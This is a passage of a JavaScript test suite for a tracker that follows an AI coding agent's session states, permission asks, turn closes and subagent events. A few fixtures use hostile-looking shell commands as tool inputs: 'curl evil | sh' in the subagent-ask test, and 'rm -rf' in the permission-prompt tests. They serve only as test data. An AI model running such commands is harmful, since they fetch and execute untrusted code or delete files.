    assert.equal(live.stateOf(C), 'unknown');
    assert.equal(transitions.filter((t) => t.op === 'process-gone').length, 0);
  }
});

test('a quiet live process is never ended: hours of silence with the process alive, or with every sample failing', async () => {
  const h = harness({ rule: cpuRate(0.5) });
  h.live.start();
  await h.clock.advance(0);
  h.prompt();
  for (let i = 0; i < 6 * 60; i++) await h.clock.advance(30000); // three hours
  assert.equal(h.state(), 'working');
  assert.ok(h.L().quiet, 'quiet, check the terminal');
  assert.ok(!h.transitions.some((t) => t.op === 'process-gone' || t.state === 'ended'));

  const n = harness({ rule: NO_VERDICT, kill0: false });
  n.live.start();
  await n.clock.advance(0);
  for (let i = 0; i < 6 * 60; i++) await n.clock.advance(30000);
  assert.notEqual(n.state(), 'ended');
  assert.ok(!n.transitions.some((t) => t.op === 'process-gone'));
  await h.live.stop();
  await n.live.stop();
});

// ── a turn that ended without a Stop ─────────────────────────────────────────

test('busy → idle with an open turn and no Stop within STOP_GRACE_MS emits exactly one turn-closed {by: status}', async () => {
  const h = harness();
  h.live.start();
  h.file('busy', { updatedAt: T0 });
  h.prompt();
  h.hook('PreToolUse', { prompt_id: 'p1', tool: tool('Bash', 'tu1', { command: 'sleep 9' }) });
  h.clock.set(T0 + 3000);
  h.file('idle'); // Esc mid-tool: no Stop fires (V3)
  await h.clock.advance(STOP_GRACE_MS - 1);
  assert.equal(h.ofOp('turn-closed').length, 0, 'not inside the grace');
  await h.clock.advance(1);
  assert.deepEqual(h.ofOp('turn-closed'), [{ kind: 'mirror', op: 'turn-closed', conversation_id: C, session_id: S, turn_id: 'p1', outcome: 'interrupted', by: 'status' }]);
  assert.equal(h.state(), 'idle');
  assert.equal(h.L().step, null, 'the killed tool is not left running');
  assert.equal(h.L().last_turn.outcome, 'interrupted');
  await h.clock.advance(60000);
  assert.equal(h.ofOp('turn-closed').length, 1, 'exactly one');
  await h.live.stop();
});

test('waiting → idle (Esc at a permission prompt) closes the turn by status and clears the ask by esc', async () => {
  const h = harness();
  h.live.start();
  h.prompt();
  h.hook('PermissionRequest', { prompt_id: 'p1', tool: tool('Bash', 'tb', { command: 'rm -rf /tmp/x' }) });
  h.file('waiting', { waitingFor: 'permission prompt' });
  assert.equal(h.state(), 'waiting');
  h.clock.set(T0 + 5000);
  h.file('idle');
  assert.deepEqual(h.ofOp('waiting-cleared'), [{ kind: 'mirror', op: 'waiting-cleared', conversation_id: C, session_id: S, by: 'esc' }]);
  await h.clock.advance(STOP_GRACE_MS);
  assert.equal(h.ofOp('turn-closed').length, 1);
  assert.equal(h.state(), 'idle');
  await h.live.stop();
});

test('a Stop inside the grace emits no status close; nor does a Stop before the flip, nor going busy again', async () => {
  const a = harness();
  a.live.start();
  a.file('busy', { updatedAt: T0 });
  a.prompt();
  a.clock.set(T0 + 1000);
  a.file('idle');
  await a.clock.advance(1500);
  a.hook('Stop', { prompt_id: 'p1' });
  a.closeTurn('p1', 'done');
  await a.clock.advance(10000);
  assert.equal(a.ofOp('turn-closed').length, 0);
  assert.equal(a.state(), 'idle');
  await a.live.stop();

  const b = harness();
  b.live.start();
  b.file('busy', { updatedAt: T0 });
  b.prompt();
  b.clock.set(T0 + 1000);
  b.hook('Stop', { prompt_id: 'p1' });
  b.closeTurn('p1', 'done');
  b.file('idle');
  await b.clock.advance(10000);
  assert.equal(b.ofOp('turn-closed').length, 0);
  await b.live.stop();

  // The Stop arrived but (say) never reached the turn: its ts still says the turn ended.
  const c = harness();
  c.live.start();
  c.file('busy', { updatedAt: T0 });
  c.prompt();
  c.clock.set(T0 + 1000);
  c.hook('Stop', { prompt_id: 'p1' });
  c.file('idle');
  await c.clock.advance(10000);
  assert.equal(c.ofOp('turn-closed').length, 0);
  await c.live.stop();

  // A notification absorbed into the turn: busy again before the grace ran out.
  const d = harness();
  d.live.start();
  d.file('busy', { updatedAt: T0 });
  d.prompt();
  d.clock.set(T0 + 1000);
  d.file('idle');
  await d.clock.advance(500);
  d.file('busy');
  await d.clock.advance(10000);
  assert.equal(d.ofOp('turn-closed').length, 0);
  assert.equal(d.state(), 'working');
  await d.live.stop();
});

test('an idle written after the turn began, its busy missed between two reads, still flips (statusUpdatedAt)', async () => {
  const h = harness();
  h.live.start();
  h.file('idle', { statusUpdatedAt: T0 - 60000 });
  h.prompt();
  h.clock.set(T0 + 900);
  h.file('idle', { statusUpdatedAt: T0 + 800 });
  await h.clock.advance(STOP_GRACE_MS);
  assert.equal(h.ofOp('turn-closed').length, 1);

  // The same idle read again flips nothing; an idle older than the turn never did.
  const g = harness();
  g.live.start();
  g.file('idle', { statusUpdatedAt: T0 - 60000 });
  g.prompt();
  g.file('idle', { statusUpdatedAt: T0 - 60000 });
  await g.clock.advance(60000);
  assert.equal(g.ofOp('turn-closed').length, 0);
  await h.live.stop();
  await g.live.stop();
});

test('a read that lands late still gives a Stop in flight the whole grace; the turn ends at the status write', async () => {
  // The file went idle at +2 s; the read that sees it lands at +5 s (a slow poll, a stalled loop).
  const late = async (w) => {
    w.live.start();
    w.file('busy', { updatedAt: T0, statusUpdatedAt: T0 });
    w.hook('UserPromptSubmit', { prompt_id: 'p1', ts: T0 + 10, prompt: { author: 'user', text: 'go' } });
    w.clock.set(T0 + 5000);
    w.file('idle', { updatedAt: T0 + 2000, statusUpdatedAt: T0 + 2000 });
  };
  const w = wired();
  await late(w);
  await w.clock.advance(0);
  assert.equal(w.closes().length, 0, 'not decided on the read');
  await w.clock.advance(STOP_GRACE_MS - 1);
  assert.equal(w.closes().length, 0, 'the grace runs from the read, not from the write');
  await w.clock.advance(1);
  assert.deepEqual(w.closes().map((t) => [t.by, t.outcome]), [['status', 'interrupted']]);
  assert.equal(w.model.turn('p1').ended_at, T0 + 2000, 'the turn ended when the file went idle');
  await w.live.stop();

  // A Stop inside that wait: it ended normally, and no status close follows.
  const s = wired();
  await late(s);
  await s.clock.advance(STOP_GRACE_MS - 500);
  s.hook('Stop', { prompt_id: 'p1', stop: { last_assistant_message: 'Done.' } });
  await s.clock.advance(60000);
  assert.deepEqual(s.closes().map((t) => t.by), ['stop']);
  assert.equal(s.model.turn('p1').status, 'done');
  await s.live.stop();

  // live.js on its own (no turn machine wired) waits the same.
  const h = harness();
  h.live.start();
  h.file('busy', { updatedAt: T0, statusUpdatedAt: T0 });
  h.prompt();
  h.clock.set(T0 + 5000);
  h.file('idle', { updatedAt: T0 + 2000, statusUpdatedAt: T0 + 2000 });
  await h.clock.advance(STOP_GRACE_MS - 1);
  assert.equal(h.ofOp('turn-closed').length, 0);
  await h.clock.advance(1);
  assert.equal(h.ofOp('turn-closed').length, 1);
  assert.equal(h.L().last_turn.ended_at, T0 + 2000);
  await h.live.stop();
});

test('busy again voids an armed flip: the next idle arms a fresh grace, and the turn ends at that idle', async () => {
  const h = harness();
  h.live.start();
  h.file('busy', { updatedAt: T0 });
  h.prompt();
  h.clock.set(T0 + 1000);
  h.file('idle'); // armed: its grace would end at +3 s
  h.clock.set(T0 + 2000);
  h.file('busy'); // a notification absorbed into the turn: not its end
  h.clock.set(T0 + 2500);
  h.file('idle'); // a fresh flip: its grace ends at +4.5 s
  await h.clock.advance(STOP_GRACE_MS - 1);
  assert.equal(h.ofOp('turn-closed').length, 0, 'a Stop for the second idle still has its grace');
  await h.clock.advance(1);
  assert.equal(h.ofOp('turn-closed').length, 1);
  assert.equal(h.L().last_turn.ended_at, T0 + 2500, 'the turn ended at the second idle, not the first');

  // A prompt shown (waiting) voids it the same way; the Esc's idle arms the fresh one.
  const q = harness();
  q.live.start();
  q.file('busy', { updatedAt: T0 });
  q.prompt();
  q.clock.set(T0 + 1000);
  q.file('idle');
  q.clock.set(T0 + 1500);
  q.file('waiting', { waitingFor: 'permission prompt' });
  q.clock.set(T0 + 2800);
  q.file('idle');
  await q.clock.advance(STOP_GRACE_MS - 1);
  assert.equal(q.ofOp('turn-closed').length, 0);
  await q.clock.advance(1);
  assert.equal(q.ofOp('turn-closed').length, 1);
  assert.equal(q.L().last_turn.ended_at, T0 + 2800);
  await h.live.stop();
  await q.live.stop();
});

test('wired to the real turn machine: the turn machine emits the one turn-closed {by: status}, live.js none', async () => {
  const w = wired();
  w.live.start();
  w.file('busy', { updatedAt: T0 });
  w.hook('UserPromptSubmit', { prompt_id: 'p1', prompt: { author: 'user', text: 'fix the rail' } });
  w.hook('PreToolUse', { prompt_id: 'p1', tool: tool('Bash', 'tu1', { command: 'npm test' }) });
  assert.equal(w.state(), 'working');
  w.clock.set(T0 + 2000);
  w.file('idle');
  await w.clock.advance(STOP_GRACE_MS + 1);
  const closes = w.closes();
  assert.equal(closes.length, 1);
  assert.deepEqual(closes[0], { kind: 'mirror', op: 'turn-closed', conversation_id: C, session_id: S, turn_id: 'p1',
    outcome: 'interrupted', by: 'status', ended_by: 'terminal' });
  const turn = w.model.turn('p1');
  assert.equal(turn.status, 'interrupted');
  assert.equal(turn.ended_at, T0 + 2000, 'ended at the flip');
  assert.equal(w.state(), 'idle');
  assert.equal(w.L().last_turn.outcome, 'interrupted');
  assert.equal(w.L().last_turn.id, 'p1');
  await w.clock.advance(60000);
  assert.equal(w.closes().length, 1);
  await w.live.stop();

  const s = wired();
  s.live.start();
  s.file('busy', { updatedAt: T0 });
  s.hook('UserPromptSubmit', { prompt_id: 'p1', prompt: { author: 'user', text: 'go' } });
  s.clock.set(T0 + 2000);
  s.file('idle');
  await s.clock.advance(300);
  s.hook('Stop', { prompt_id: 'p1', stop: { last_assistant_message: 'Done.' } });
  await s.clock.advance(60000);
  assert.deepEqual(s.closes().map((t) => t.by), ['stop']);
  assert.equal(s.model.turn('p1').status, 'done');
  assert.equal(s.L().last_turn.outcome, 'done');
  await s.live.stop();
});

test('wired: live.js\'s rules before the turn machine\'s, or after, give the same outcome', async () => {
  const run = async (liveFirst) => {
    const w = wired({ pid: null, liveFirst });
    w.live.start();
    const ask = tool('Bash', 'tb', { command: 'npm publish' });
    w.file('busy', { updatedAt: T0 });
    w.hook('UserPromptSubmit', { prompt_id: 'p1', prompt: { author: 'user', text: 'ship it' } });
    w.hook('PreToolUse', { prompt_id: 'p1', tool: ask, ts: T0 + 10 });
    w.file('waiting', { waitingFor: 'permission prompt' });
    w.hook('PermissionRequest', { prompt_id: 'p1', tool: ask, ts: T0 + 20 });
    const waiting = w.L();
    w.clock.set(T0 + 500);
    w.file('busy'); // a terminal Yes
    w.hook('PostToolUse', { prompt_id: 'p1', tool: ask, ts: T0 + 400 });
    const working = w.L();
    w.clock.set(T0 + 2000);
    w.file('idle'); // an Esc: no Stop comes
    await w.clock.advance(STOP_GRACE_MS * 2);
    const out = {
      waiting, working, end: w.L(),
      states: w.sink.filter((t) => t.op === 'state').map((t) => t.state),
      cleared: w.sink.filter((t) => t.op === 'waiting-cleared').map((t) => t.by),
      closes: w.closes().map((t) => [t.by, t.outcome]),
    };
    await w.live.stop();
    return out;
  };
  const after = await run(false);
  const before = await run(true);
  assert.deepEqual(before, after);
  assert.equal(after.waiting.state, 'waiting');
  assert.equal(after.working.state, 'working');
  assert.equal(after.end.state, 'idle');
  assert.deepEqual(after.cleared, ['terminal']);
  assert.deepEqual(after.closes, [['status', 'interrupted']]);
});

test('wired: the process verdict abandons the open turn through the turn machine', async () => {
  const w = wired();
  await w.live.sampleNow();
  w.hook('UserPromptSubmit', { prompt_id: 'p1', prompt: { author: 'user', text: 'go' } });
  w.sampler.set(ABSENT);
  w.live.sampleNow();
  await settle();
  // isPidAlive is wired to say "alive" here: the verdict needs kill 0's ESRCH too.
  assert.equal(w.state(), 'working');
  const g = wired();
  g.live.onConversation({ change: 'linked', conversation: { id: C, process: { pid: PID + 1, proc_start: PROC_START } } });
  g.hook('UserPromptSubmit', { prompt_id: 'p1', prompt: { author: 'user', text: 'go' } });
  g.sampler.set(alive(0, 'S+', START_MS + 3600000));
  await g.live.sampleNow();
  assert.equal(g.state(), 'ended');
  assert.deepEqual(g.closes().map((t) => [t.by, t.outcome]), [['process-gone', 'abandoned']]);
  assert.equal(g.sink.filter((t) => t.op === 'process-gone').length, 1);
});

// ── pending asks ─────────────────────────────────────────────────────────────

test('an sdk entrypoint is never pending: the envelope\'s, or the conversation\'s', () => {
  const e = harness({ pid: null, entrypoint: 'sdk-cli' });
  e.prompt();
  e.hook('PermissionRequest', { prompt_id: 'p1', tool: tool('Bash', 'tb', { command: 'ls' }) });
  assert.equal(e.state(), 'working');
  assert.equal(e.L().waiting, null);
  e.hook('PostToolUse', { prompt_id: 'p1', tool: tool('Bash', 'tb', { command: 'ls' }), ts: T0 + 10 });
  assert.equal(e.ofOp('waiting-cleared').length, 0, 'nothing was pending, so nothing clears');

  const c = harness({ pid: null });
  c.live.onConversation({ change: 'linked', conversation: { id: C, process: { entrypoint: 'sdk-ts' } } });
  c.prompt();
  c.hook('PermissionRequest', { prompt_id: 'p1', entrypoint: null, tool: tool('Bash', 'tb', { command: 'ls' }) });
  assert.equal(c.state(), 'working');
});

test('confirmation needs the sessions file\'s waiting, or no sessions file at all — a file that disappeared confirms nothing', () => {
  const h = harness();
  h.file('busy', { updatedAt: T0 });
  h.prompt();
  h.hook('PermissionRequest', { prompt_id: 'p1', tool: tool('Bash', 'tb', { command: 'npm publish' }) });
  assert.equal(h.state(), 'working', 'pending, not confirmed: the file still says busy');
  assert.equal(h.L().waiting, null);
  h.file('waiting', { waitingFor: 'permission prompt' });
  assert.equal(h.state(), 'waiting');
  assert.equal(h.L().waiting.summary, 'Bash(npm publish)');
  assert.equal(h.L().waiting.pending, true);

  const none = harness({ pid: null });
  none.prompt();
  none.hook('PermissionRequest', { prompt_id: 'p1', tool: tool('Bash', 'tb', { command: 'ls' }) });
  assert.equal(none.state(), 'waiting', 'no sessions file linked at all');

  const gone = harness();
  gone.file('busy', { updatedAt: T0 });
  gone.prompt();
  gone.live.noteSessionState(C, null); // the file went away: the process is exiting
  gone.hook('PermissionRequest', { prompt_id: 'p1', tool: tool('Bash', 'tb', { command: 'ls' }) });
  assert.equal(gone.state(), 'working');
});

test('a newer event of the same session and agent clears the ask; an older one, another agent\'s or another session\'s does not', () => {
  const cases = [
    ['PostToolUse', { tool: tool('Bash', 'tb', { command: 'ls' }) }, 'tool-ran'],
    ['PostToolUseFailure', { tool: tool('Bash', 'tb', { command: 'ls' }) }, 'tool-ran'],
    ['PreToolUse', { tool: tool('Read', 'tr', { file_path: 'a.js' }) }, 'tool-ran'],
    ['Stop', {}, 'turn-closed'],
    ['StopFailure', {}, 'turn-closed'],
    ['UserPromptSubmit', { prompt_id: 'p2', prompt: { author: 'user', text: 'next' } }, 'turn-closed'],
  ];
  for (const [event, fields, by] of cases) {
    const h = harness({ pid: null });
    h.prompt();
    h.clock.set(T0 + 100);
    h.hook('PermissionRequest', { prompt_id: 'p1', tool: tool('Bash', 'tb', { command: 'ls' }) });
    assert.equal(h.state(), 'waiting', event);
    h.hook(event, { prompt_id: 'p1', ...fields, ts: T0 + 50 }); // older: nothing
    assert.equal(h.state(), 'waiting', `${event} older than the ask`);
    h.hook(event, { prompt_id: 'p1', ...fields, ts: T0 + 200, agent: { id: 'agent-7', type: 'Explore' } });
    assert.equal(h.state(), 'waiting', `${event} of another agent`);
    h.hook(event, { prompt_id: 'p1', ...fields, ts: T0 + 210, session_id: 'sess-2' });
    assert.equal(h.state(), 'waiting', `${event} of another session`);
    h.hook(event, { prompt_id: 'p1', ...fields, ts: T0 + 300 });
    assert.notEqual(h.state(), 'waiting', event);
    assert.deepEqual(h.ofOp('waiting-cleared').map((t) => t.by), [by], event);
  }
});

test('a subagent\'s ask is cleared by its own agent\'s events, not the main agent\'s', () => {
  const h = harness({ pid: null });
  h.prompt();
  const agent = { id: 'agent-3', type: 'general-purpose' };
  h.hook('PermissionRequest', { prompt_id: 'p1', agent, tool: tool('Write', 'tw', { file_path: '/p/out.md' }), ts: T0 + 100 });
  assert.equal(h.state(), 'waiting');
  assert.equal(h.L().waiting.summary, 'Write(/p/out.md)');
  h.hook('PostToolUse', { prompt_id: 'p1', tool: tool('Read', 'tr', { file_path: 'a.js' }), ts: T0 + 200 });
  assert.equal(h.state(), 'waiting', 'the main agent ran a tool; the subagent still waits');
  h.hook('PostToolUse', { prompt_id: 'p1', agent, tool: tool('Write', 'tw', { file_path: '/p/out.md' }), ts: T0 + 300 });
  assert.equal(h.state(), 'working');
  assert.deepEqual(h.ofOp('waiting-cleared').map((t) => t.by), ['tool-ran']);
});

test('a subagent\'s SubagentStop clears the asks it made before; another agent\'s, an older one, or one naming no agent does not', () => {
  const agent = { id: 'agent-3', type: 'general-purpose' };
  const write = tool('Write', 'tw', { file_path: '/p/out.md' });
  const h = harness({ pid: null });
  h.prompt();
  h.clock.set(T0 + 100);
  h.hook('PermissionRequest', { prompt_id: 'p1', agent, tool: write });
  assert.equal(h.state(), 'waiting');
  h.hook('SubagentStop', { prompt_id: 'p1', agent, ts: T0 + 50 });
  assert.equal(h.state(), 'waiting', 'older than the ask');
  h.hook('SubagentStop', { prompt_id: 'p1', agent: { id: 'agent-9', type: 'Explore' }, ts: T0 + 200 });
  assert.equal(h.state(), 'waiting', 'another agent\'s end');
  h.hook('SubagentStop', { prompt_id: 'p1', ts: T0 + 210 });
  assert.equal(h.state(), 'waiting', 'a SubagentStop that names no agent is no subagent\'s end');
  assert.equal(h.ofOp('waiting-cleared').length, 0);
  h.hook('SubagentStop', { prompt_id: 'p1', agent, ts: T0 + 300 });
  assert.equal(h.state(), 'working');
  assert.equal(h.L().waiting, null);
  assert.deepEqual(h.ofOp('waiting-cleared'), [{ kind: 'mirror', op: 'waiting-cleared', conversation_id: C, session_id: S, by: 'turn-closed' }]);

  // A subagent's end never clears the main agent's ask.
  const m = harness({ pid: null });
  m.prompt();
  m.clock.set(T0 + 100);
  m.hook('PermissionRequest', { prompt_id: 'p1', tool: tool('Bash', 'tb', { command: 'ls' }) });
  m.hook('SubagentStop', { prompt_id: 'p1', agent, ts: T0 + 300 });
  assert.equal(m.state(), 'waiting');

  // The SubagentStop arriving first: the ask it ended is cleared on arrival, never waiting.
  const late = harness({ pid: null });
  late.prompt();
  late.clock.set(T0 + 1000);
  late.hook('SubagentStop', { prompt_id: 'p1', agent, ts: T0 + 300 });
  late.hook('PermissionRequest', { prompt_id: 'p1', agent, ts: T0 + 100, tool: write });
  assert.ok(!late.transitions.some((t) => t.state === 'waiting'));
  assert.deepEqual(late.ofOp('waiting-cleared').map((t) => t.by), ['turn-closed']);
});

test('a Stop that names an agent is that agent\'s end, never the turn\'s — in either arrival order', () => {
  const h = harness({ pid: null });
  h.prompt();
  h.clock.set(T0 + 100);
  // The main agent's ask before it, arriving before it…
  h.hook('PermissionRequest', { prompt_id: 'p1', tool: tool('Bash', 'tb', { command: 'ls' }) });
  h.hook('Stop', { prompt_id: 'p1', ts: T0 + 200, agent: { id: 'agent-7', type: 'Explore' } });
  // …and another made before it, arriving after it: neither is the agent's to clear.
  h.hook('PermissionRequest', { prompt_id: 'p1', ts: T0 + 150, tool: tool('Bash', 'tc', { command: 'pwd' }) });
  assert.equal(h.state(), 'waiting');
  assert.equal(h.ofOp('waiting-cleared').length, 0);
  assert.equal(h.L().step, null);
});

test('the turn closing clears every ask of its session made before it, a subagent\'s too, in every arrival order', () => {
  const agent = { id: 'agent-a', type: 'general-purpose' };
  const ask = tool('Bash', 'ta', { command: 'rm -rf x' });
  const next = ['UserPromptSubmit', { prompt_id: 'p2', ts: T0 + 400, prompt: { author: 'user', text: 'next' } }];
  const scenarios = {
    // The subagent asked, ended, then the main agent stopped and the next prompt came (no sessions file at all).
    'its own end': [
      ['PermissionRequest', { prompt_id: 'p1', agent, tool: ask, ts: T0 + 100 }],
      ['SubagentStop', { prompt_id: 'p1', agent, ts: T0 + 200 }],
      ['Stop', { prompt_id: 'p1', ts: T0 + 300 }],
      next,
    ],
    // Its SubagentStop lost: the turn's close alone clears it.
    'the close alone': [
      ['PermissionRequest', { prompt_id: 'p1', agent, tool: ask, ts: T0 + 100 }],
      ['Stop', { prompt_id: 'p1', ts: T0 + 300 }],
      next,
    ],
    // No Stop either: the next prompt closes the turn (next-turn), and that close clears it.
    'the next prompt': [
      ['PermissionRequest', { prompt_id: 'p1', agent, tool: ask, ts: T0 + 100 }],
      next,
    ],
  };
  for (const [name, events] of Object.entries(scenarios)) {
    for (const liveFirst of [false, true]) {
      const outcomes = new Set();
      for (const order of permutations(events)) {
        const w = wired({ pid: null, liveFirst });
        w.hook('UserPromptSubmit', { prompt_id: 'p1', ts: T0, prompt: { author: 'user', text: 'go' } });
        w.clock.set(T0 + 5000);
        for (const [event, fields] of order) w.hook(event, fields);
        const where = `${name} (${liveFirst ? 'live first' : 'turn machine first'}): ${order.map(([e]) => e).join(' → ')}`;
        assert.deepEqual(w.sink.filter((t) => t.op === 'waiting-cleared').map((t) => t.by), ['turn-closed'], where);
        const l = w.L();
        outcomes.add(stableKey({ state: l.state, waiting: l.waiting, step: l.step }));
      }
      assert.deepEqual([...outcomes], [stableKey({ state: 'working', waiting: null, step: null })], name);
    }
  }
});

test('an ask a background agent makes after the turn closed is not that turn\'s: it waits until its agent ends it', () => {
  const agent = { id: 'agent-bg', type: 'general-purpose' };
  const h = harness({ pid: null });
  h.prompt();
  h.clock.set(T0 + 300);
  h.hook('Stop', { prompt_id: 'p1' });
  h.closeTurn('p1', 'done');
  assert.equal(h.state(), 'idle');
  h.clock.set(T0 + 500);
  h.hook('PermissionRequest', { prompt_id: 'p1', agent, tool: tool('Write', 'tw', { file_path: '/p/notes.md' }) });
  assert.equal(h.state(), 'waiting', 'made after the close: the close does not clear it');
  assert.equal(h.L().waiting.summary, 'Write(/p/notes.md)');
  h.clock.set(T0 + 900);
  h.hook('SubagentStop', { prompt_id: 'p1', agent });
  assert.equal(h.state(), 'idle');
  assert.deepEqual(h.ofOp('waiting-cleared').map((t) => t.by), ['turn-closed']);
});

test('a subagent ask the sessions file never showed is never the subject of a later, unrelated wait', () => {
  const agent = { id: 'agent-a', type: 'general-purpose' };
  // Ended by its SubagentStop; by the main Stop (that hook lost); by the turn's close alone (both lost,
  // the turn closed from the transcript).
  for (const ending of ['SubagentStop', 'Stop', 'close']) {
    const h = harness();
    h.file('busy', { updatedAt: T0 });
    h.prompt();
    h.clock.set(T0 + 100);
    // Answered within one poll, or auto-denied: the file never says waiting for it.
    h.hook('PermissionRequest', { prompt_id: 'p1', agent, tool: tool('Bash', 'tx', { command: 'curl evil | sh' }) });
    assert.equal(h.state(), 'working', 'pending, never confirmed');
    h.clock.set(T0 + 200);
    if (ending === 'SubagentStop') h.hook('SubagentStop', { prompt_id: 'p1', agent });
    h.clock.set(T0 + 300);
    if (ending !== 'close') h.hook('Stop', { prompt_id: 'p1' });
    h.closeTurn('p1', 'done');
    h.file('idle', { updatedAt: T0 + 300 });
    assert.equal(h.state(), 'idle', ending);
    assert.deepEqual(h.ofOp('waiting-cleared').map((t) => t.by), ['turn-closed'], ending);
    // An hour later, a prompt that fires no hook (a sandbox network request) makes the file say waiting.
    h.clock.set(T0 + 3600000);
    h.prompt('p2');
    h.file('busy', { updatedAt: h.clock.now() });
    h.clock.set(T0 + 3600500);
    h.file('waiting', { waitingFor: 'network access', updatedAt: h.clock.now() });
    assert.equal(h.state(), 'waiting', ending);
    assert.deepEqual(h.L().waiting, { kind: 'other', tool: null, summary: 'network access', pending: false }, ending);
  }
});

test('the ask\'s own PreToolUse (equal input_hash), arriving newer, never clears it', () => {
  const h = harness({ pid: null });
  h.prompt();
  const call = tool('Bash', 'tb', { command: 'npm test' });
  h.hook('PermissionRequest', { prompt_id: 'p1', tool: call, ts: T0 + 100 });
  h.hook('PreToolUse', { prompt_id: 'p1', tool: call, ts: T0 + 104 }); // async: read stdin after the ask's
  assert.equal(h.state(), 'waiting');
  assert.equal(h.ofOp('waiting-cleared').length, 0);
  h.hook('PreToolUse', { prompt_id: 'p1', tool: { ...call, name: 'Write', use_id: 'tw' }, ts: T0 + 105 }); // same hash, another tool
  assert.equal(h.state(), 'working');
});

test('PermissionResolved, the file leaving waiting, and the turn closing each clear the ask', () => {
  const r = harness({ pid: null });
  r.prompt();
  r.hook('PermissionRequest', { prompt_id: 'p1', tool: tool('Bash', 'tb', { command: 'ls' }), ask: { id: 'ask_aaaaaaaaaaaa', kind: 'permission' } });
  r.hook('PermissionResolved', { prompt_id: 'p1', ask: { id: 'ask_aaaaaaaaaaaa', outcome: 'allowed', by: 'web' }, synthetic: true });
  assert.deepEqual(r.ofOp('waiting-cleared'), [{ kind: 'mirror', op: 'waiting-cleared', conversation_id: C, session_id: S, ask_id: 'ask_aaaaaaaaaaaa', by: 'web' }]);
  assert.equal(r.state(), 'working');

  const y = harness();
  y.prompt();
  y.file('waiting', { waitingFor: 'permission prompt' });
  y.hook('PermissionRequest', { prompt_id: 'p1', tool: tool('Bash', 'tb', { command: 'ls' }) });
  y.clock.set(T0 + 3000);
  y.file('busy'); // a terminal Yes (V10: busy 52 ms after the keypress)
  assert.deepEqual(y.ofOp('waiting-cleared').map((t) => t.by), ['terminal']);
  assert.equal(y.state(), 'working');

  const t = harness({ pid: null });
  t.prompt();
  t.hook('PermissionRequest', { prompt_id: 'p1', tool: tool('Bash', 'tb', { command: 'ls' }) });
  t.clock.set(T0 + 10);
  t.closeTurn('p1', 'interrupted');
  assert.deepEqual(t.ofOp('waiting-cleared').map((x) => x.by), ['turn-closed']);
  assert.equal(t.state(), 'idle');
});

test('an ask made after the file left waiting is the next prompt\'s, not cleared by that leave', () => {
  const h = harness();
  h.prompt();
  h.file('waiting', { waitingFor: 'permission prompt', statusUpdatedAt: T0 + 10 });
  h.hook('PermissionRequest', { prompt_id: 'p1', ts: T0 + 20, tool: tool('Bash', 'tb', { command: 'ls' }) });
  // The next prompt's request lands before the read that sees the first one answered.
  h.hook('PermissionRequest', { prompt_id: 'p1', ts: T0 + 500, tool: tool('Bash', 'tc', { command: 'pwd' }) });
  h.clock.set(T0 + 900);
  h.file('busy', { statusUpdatedAt: T0 + 400 });
  assert.deepEqual(h.ofOp('waiting-cleared').map((t) => t.by), ['terminal'], 'only the first');
  h.file('waiting', { waitingFor: 'permission prompt', statusUpdatedAt: T0 + 480 });
  assert.equal(h.state(), 'waiting');
  assert.equal(h.L().waiting.summary, 'Bash(pwd)');
});

test('an ask that arrives after the event that answered it is cleared on arrival, never waiting', () => {
  for (const [event, fields, by] of [
    ['PostToolUse', { tool: tool('Bash', 'tb', { command: 'ls' }) }, 'tool-ran'],
    ['PreToolUse', { tool: tool('Read', 'tr', { file_path: 'a.js' }) }, 'tool-ran'],
    ['Stop', {}, 'turn-closed'],
  ]) {
    const h = harness({ pid: null });
    h.prompt();
    h.hook(event, { prompt_id: 'p1', ts: T0 + 300, ...fields });
    h.hook('PermissionRequest', { prompt_id: 'p1', ts: T0 + 100, tool: tool('Bash', 'tb', { command: 'ls' }) });
    assert.ok(!h.transitions.some((t) => t.state === 'waiting'), event);
    assert.deepEqual(h.ofOp('waiting-cleared').map((t) => t.by), [by], event);
  }
  // The asks domain resolved it first.
  const r = harness({ pid: null });
  r.prompt();
  r.hook('PermissionResolved', { ask: { id: 'ask_bbbbbbbbbbbb', by: 'terminal' }, ts: T0 + 300 });
  r.hook('PermissionRequest', { ts: T0 + 100, tool: tool('Bash', 'tb', { command: 'ls' }), ask: { id: 'ask_bbbbbbbbbbbb' } });
  assert.equal(r.state(), 'working');
  assert.deepEqual(r.ofOp('waiting-cleared').map((t) => [t.ask_id, t.by]), [['ask_bbbbbbbbbbbb', 'terminal']]);
  // The file left waiting (with the time it did) before the ask's envelope came in.
  const f = harness();
  f.prompt();
  f.clock.set(T0 + 1000);
  f.file('waiting', { waitingFor: 'permission prompt', statusUpdatedAt: T0 + 90 });
  f.file('idle', { statusUpdatedAt: T0 + 400 });
  f.hook('PermissionRequest', { ts: T0 + 100, tool: tool('Bash', 'tb', { command: 'ls' }) });
  assert.deepEqual(f.ofOp('waiting-cleared').map((t) => t.by), ['esc']);
});

// ── arrival order ─────────────────────────────────────────────────────────────

test('a PostToolUse arriving before its PreToolUse leaves no running step', () => {
  const h = harness();
  h.prompt();
  const call = tool('Read', 'tr', { file_path: '/p/app.css' });
  h.clock.set(T0 + 5000);
  h.hook('PostToolUse', { prompt_id: 'p1', tool: call, ts: T0 + 40 });
  h.hook('PreToolUse', { prompt_id: 'p1', tool: call, ts: T0 + 20 });
  assert.equal(h.state(), 'working');
  assert.equal(h.L().step, null, 'never `Read · app.css · 1:30`');
  // Still data, not a step, when it is this late (the id is remembered for TOMBSTONE_MS).
  h.clock.set(T0 + 5000 + TOMBSTONE_MS - 1);
  h.hook('PreToolUse', { prompt_id: 'p1', tool: call, ts: T0 + 21 });
  assert.equal(h.L().step, null);
});

test('a PreToolUse older than its session\'s last Stop is data, never a running step', () => {
  const h = harness();
  h.prompt();
  h.hook('Stop', { prompt_id: 'p1', ts: T0 + 500 });
  h.closeTurn('p1', 'done');
  h.clock.set(T0 + 600);
  h.prompt('p2');
  h.hook('PreToolUse', { prompt_id: 'p1', tool: tool('Bash', 'late', { command: 'ls' }), ts: T0 + 400 });
  assert.equal(h.L().step, null);
  h.hook('PreToolUse', { prompt_id: 'p2', tool: tool('Bash', 'now', { command: 'pwd' }), ts: T0 + 700 });
  assert.equal(h.L().step.label, 'Bash · pwd');
});

test('the step is the running tool with the newest PreToolUse ts, not the last to arrive', () => {
  const h = harness();
  h.prompt();
  h.clock.set(T0 + 1000);
  h.hook('PreToolUse', { prompt_id: 'p1', tool: tool('Grep', 'g', { pattern: 'rail' }), ts: T0 + 300 });
  h.hook('PreToolUse', { prompt_id: 'p1', tool: tool('Read', 'r', { file_path: 'b.js' }), ts: T0 + 200 });
  assert.equal(h.L().step.label, 'Grep · rail');
